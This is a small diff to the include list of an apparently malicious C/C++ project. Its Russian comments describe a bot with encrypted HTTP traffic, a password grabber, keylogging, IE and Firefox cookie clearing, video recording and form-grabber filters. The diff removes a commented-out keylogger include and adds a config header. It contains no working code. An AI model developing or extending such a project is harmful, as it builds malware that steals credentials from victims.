@@ -18,7 +18,6 @@
 #include "BotCryptHTTP.h" // Шифрование отправляемых и принимаемых данных
 
 #include "KeyLogSystems.h"
-//#include "KeyLogger.h"
 
 #include "Grabber.h" // Включение грабера паролей
 #include "coocksol.h" // Очистка куков ИЕ и ФФ
@@ -35,4 +34,5 @@
 #include "VideoRecorder.h"
 
 #include "FgrFilters.h" 
+#include "AzConfig.h"
 
